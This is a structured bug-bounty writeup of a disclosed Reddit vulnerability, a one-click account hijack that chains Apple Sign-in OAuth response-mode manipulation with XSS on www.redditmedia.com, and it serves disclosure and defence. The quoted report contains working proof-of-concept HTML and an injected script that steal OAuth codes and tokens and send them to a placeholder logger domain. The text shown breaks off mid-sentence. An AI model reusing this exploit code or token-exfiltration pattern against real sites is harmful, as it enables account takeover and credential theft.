# One-click account hijack via Apple Sign-in OAuth parameter manipulation and XSS on www.redditmedia.com

## Metadata
- **Source:** HackerOne
- **Report:** 1567186 | https://hackerone.com/reports/1567186
- **Submitted:** 2022-05-12
- **Reporter:** fransrosen
- **Program:** Reddit
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** OAuth Protocol Confusion, Response Type/Mode Manipulation, Cross-Site Scripting (XSS), Insecure Redirect URI Configuration, Cross-Origin Information Disclosure, Token Leakage via URL Fragment
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can hijack any Reddit account using Apple Sign-in by manipulating OAuth parameters (response_type and response_mode) to leak authorization codes and access tokens via URL fragments, combined with an XSS vulnerability on www.redditmedia.com to exfiltrate credentials. The attack exploits Reddit's failure to restrict alternative OAuth response modes and insecure handling of tokens in URL fragments.

## Attack scenario
1. Attacker initiates Apple Sign-in flow on Reddit and captures their own state parameter from the OAuth authorization URL
2. Attacker crafts a malicious page hosting an iframe pointing to www.redditmedia.com with the captured state parameter injected
3. Attacker sends the malicious link to victim; victim clicks and is redirected through Apple Sign-in with attacker's state parameter
4. Upon authentication, Apple returns tokens to reddit.com via URL fragment (response_mode=fragment instead of web_message), exposing tokens in #state=xxx&code=xxx&access_token=xx
5. XSS vulnerability on www.redditmedia.com iframe (same origin) extracts window.name from parent iframe containing token-laden URL
6. Attacker's server receives stolen tokens and uses postMessage to complete hijacking by signing in as victim via Apple popup

## Root cause
Multiple compounding security failures: (1) OAuth application configuration allows response_mode=fragment despite expecting web_message, (2) redirect_uri validation insufficient to prevent token leakage to main domain, (3) XSS exists on www.redditmedia.com sandbox domain, (4) tokens stored in URL fragments without CSRF/state validation to prevent cross-origin token injection, (5) www.redditmedia.com allows window.name communication channel to leak parent window URLs

## Attacker mindset
Sophisticated OAuth researcher identifying novel parameter confusion attack vector by combining response mode switching with same-origin XSS to leak tokens. Attacker recognizes that alternative response modes are often left unvalidated and that sandbox domains with XSS become token theft vectors when they can access parent window context.

## Defensive takeaways
- Restrict OAuth response_mode to only intended values (web_message for Reddit); explicitly reject fragment/form_post in application configuration
- Implement response_mode validation in OAuth provider configuration and reject requests with disallowed response modes
- Remove or strictly validate redirect_uri to prevent unintended token delivery to attacker-controlled domains
- Never place OAuth tokens in URL fragments; use web_message or other secure delivery mechanisms that don't expose tokens in browser history/logs
- Implement strict Content Security Policy on all domains including sandbox domains (www.redditmedia.com) to prevent XSS
- Add CSRF token tied to specific user session that validates state parameter and prevents state reuse across users
- Implement same-site cookie attribute to prevent token theft via postMessage from cross-site contexts
- Monitor and alert on state parameter reuse across multiple sign-in attempts

## Variant hunting
Test other OAuth providers (Google, GitHub, Facebook) integrated with Reddit for similar response_mode confusion attacks
Examine other subdomains/sandbox domains (.redditmedia.com variants) for XSS vulnerabilities that could be chained with OAuth token leakage
Investigate whether other response_modes (form_post, query) are also unvalidated in Apple Sign-in configuration
Test if redirect_uri validation can be bypassed using open redirects on reddit.com domains
Search for other window.name communication channels or postMessage listeners that could exfiltrate tokens
Review all OAuth integrations (not just Apple) for similar response mode handling and validation gaps
Test whether access_token vs code parameters have different validation/expiration properties that could be exploited

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application (OAuth confusion)
- T1598: Phishing (victim lured to malicious link)
- T1539: Steal Web Session Cookie / OAuth Token
- T1056: Capture Access Token via XSS
- T1566: Phishing - Spearphishing Link
- T1021: Remote Services - Web Session Hijacking

## Notes
This is an exemplary OAuth security research writeup demonstrating how multiple individually-acceptable design choices compound into critical vulnerability. The attack chain requires sophisticated understanding of OAuth spec nuances, same-origin policy, and browser security boundaries. Video proof-of-concept significantly strengthens report credibility. The vulnerability exemplifies why OAuth providers should whitelist rather than blacklist response modes and why tokens should never transit through URLs. Remarkably, the attacker successfully exploited both Reddit's OAuth configuration AND www.redditmedia.com's XSS in a single chain, showing defense-in-depth failure.

## Full report
<details><summary>Expand</summary>

Hi,

# Description

I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.

The way it works is this:

1. Attacker prepares a `state`-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
2. Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with `www.redditmedia.com`, which is an intentional sandbox but with a fun quirk, it uses `window.name` of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
3. The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the `state`-value that the attacker set. Also, the `response_type` is modified from `code` to `code+id_token` and the `response_mode` to `fragment`. This is the second important part why we can steal the code, since Reddit uses `response_mode=web_message` live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. **Reddit is not expecting to get any sensitive tokens in the URL fragment.** Also, the `redirect_uri` set in the OAuth-application in Apple for Reddit is allowing `https://reddit.com` only as the return page. This is something you need to remove, or point elsewhere. When you're using `response_mode=web_message`, the `redirect_uri` doesn't really matter what it is set to, since the whole origin of `https://reddit.com` will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
4. Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's `state`-parameter. When the login process is completed, the URL of the main page becomes `https://reddit.com/#state=xxx&code=xxx&access_token=xx`.
5. The XSS on `www.redditmedia.com` in the first window, which has the same domain as the iframe, will be allowed to ask about the `window.name` of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.

Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:

{F1726830}

And here's a link for testing:

```
https://fransrosen.com/reddit-hijack-424342.html
```

# Technical details

Here's the HTML of the malicious page:

```html
<html>
<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
<body>
<div id="start">
Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
<input id="state">
<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
</div>


<div id="fr"></div>

<script>
var inj, monitor;
function extractstate(st) {
    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
}
function startmonitor(st) {
    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
    monitor = setInterval(function() {
        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
            if (e.length) {
                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
                var p = document.createElement('pre');
                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
                document.getElementById('fr').appendChild(p)
                clearInterval(monitor);
            }
        });
    }, 2000);
}
function launch(st, showonly) {
    if (showonly) {
        history.pushState('/','/',location.pathname + '?state=' + st)
        document.getElementById('fr').innerText = 'Send this link to victim: ';
        var p = document.createElement('pre');
        p.innerText = location.href;
        document.getElementById('fr').appendChild(p);
        startmonitor(st);
    } else {
        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
    }
    document.getElementById('start').innerHTML = '';
}
if (location.search && location.search.split('state=')[1].split('&')[0]) {
    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
}
window.onmessage = function(e) {
    if (e.data === 'stopinject') {
        console.log('frame injected');
        clearInterval(inj)
    }
    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
        payload = JSON.parse(e.data);
        data = payload.hash.replace('state=state=', 'state=');
        var state = data.split('state=')[1].split('&')[0];
        var code = data.split('code=')[1].split('&')[0];
        var id_token = data.split('id_token=')[1].split('&')[0];
        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});

        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
        var p = document.createElement('pre');
        p.innerText = payload;
        document.getElementById('fr').appendChild(p);

        var s = document.createElement('img');
        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
        document.body.appendChild(s);   
    }
}

</script>


</body>
</html>
```

What this page will do is:

1. Ask the attacker to prepare the `state`-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.

{F1726829}

{F1726831}

2. Load the `https://www.redditmedia.com` with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
3. The GTM-script will load, it looks like this:

```html
<script>var b, x;
var state = parent.location.href.substr(location.href.indexOf('state='));
var d = document.createElement('div');
if (!window.inited) {
  window.inited = true;
d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
parent.document.children[parent.document.children.length - 1].appendChild(d);
if(top!==parent.window) top.postMessage('stopinject', '*');
parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
x = setInterval(function() {
if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
  clearInterval(x);
};

}, 500);
}
</script>
```

4. This javascript will render the "Click here"-link:

{F1726833}

It will a

</details>

---
*Analysed by Claude on 2026-05-11*
